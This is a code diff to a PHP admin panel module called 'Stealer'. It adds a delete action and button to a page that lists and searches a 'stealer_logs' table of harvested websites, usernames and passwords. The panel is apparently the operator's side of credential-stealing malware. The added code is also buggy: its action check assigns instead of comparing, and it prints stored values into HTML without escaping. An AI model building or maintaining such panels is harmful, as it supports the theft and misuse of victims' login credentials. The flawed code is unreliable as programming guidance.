@@ -21,7 +21,15 @@ if (!db_table_exists('stealer_logs'))
 }
 if (!$install)
 {
-	$TEMPLATE['text'] = '<form method="GET" role="form" class="form-inline">
+	$TEMPLATE['text'] = '';
+	if (isset($_GET['a']) && isset($_GET['id']) && $_GET['a'] = 'del')
+	{
+		db_query("DELETE FROM `stealer_logs` WHERE `id` = :1", $_GET['id']);
+		$TEMPLATE['text'] .= '<div class="alert alert-info">Deleted data.</div>';
+	}
+
+
+	$TEMPLATE['text'] .= '<form method="GET" role="form" class="form-inline">
 							<input type="hidden" name="p" value="module" />
 							<input type="hidden" name="m" value="Stealer" />
 							<div class="form-group">
@@ -41,6 +49,7 @@ if (!$install)
 								<th>User</th>
 								<th>Pass</th>
 								<th>Date</th>
+								<th></th>
 							</tr>';
 	$search = isset($_GET['search']) ? $_GET['search'] : 'x';
 	$WHERE = isset($_GET['search']) ? "`website` LIKE concat('%', :1, '%')" : ':1 = :1';
@@ -58,6 +67,9 @@ if (!$install)
 											<td>{$row['user']}</td>
 											<td>{$row['pass']}</td>
 											<td>{$row['date']}</td>
+											<td style=\"width: 100px;\">
+												<a href=\"?p=module&m=Stealer&a=del&id={$row['id']}\" class=\"btn btn-danger\"><i class=\"glyphicon glyphicon-trash\"></i></a>
+											</td>
 										</tr>";
 	}
 	$TEMPLATE['text'] .= '</table>
